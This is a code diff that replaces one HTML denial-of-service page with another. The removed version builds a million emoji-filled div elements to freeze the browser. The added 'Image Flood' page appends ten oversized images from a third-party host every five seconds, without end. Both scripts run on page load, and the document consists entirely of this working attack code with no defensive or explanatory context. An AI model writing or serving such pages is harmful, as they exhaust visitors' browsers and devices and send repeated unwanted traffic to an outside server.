@@ -1,13 +1,31 @@
-<style>
-  div::before {
-    content: attr(data);
-  }
-</style>
-<div data="💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣"></div>
-<script>
-  for (let i = 0; i < 1e6; i++) {
-    let e = document.createElement('div');
-    e.setAttribute('data', '💣'.repeat(100));
-    document.body.appendChild(e);
-  }
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Flood</title>
+</head>
+<body>
+    <div id="container"></div>
+
+    <script>
+        let counter = 0;
+
+        function loadImages() {
+            const container = document.getElementById('container');
+            for (let i = 0; i < 10; i++) {
+                const img = document.createElement('img');
+                img.src = 'https://one.one.one.one/media/card.png'; // Large image URL
+                img.style.width = '3000px'; // Resize to fit screen, can adjust if needed
+                img.style.marginBottom = '1000px';
+                container.appendChild(img);
+            }
+            counter++;
+            console.log(`Loaded ${counter * 10} images so far...`);
+        }
+
+        // Load 10 images every 5 seconds
+        setInterval(loadImages, 5000);
+    </script>
+</body>
+</html>
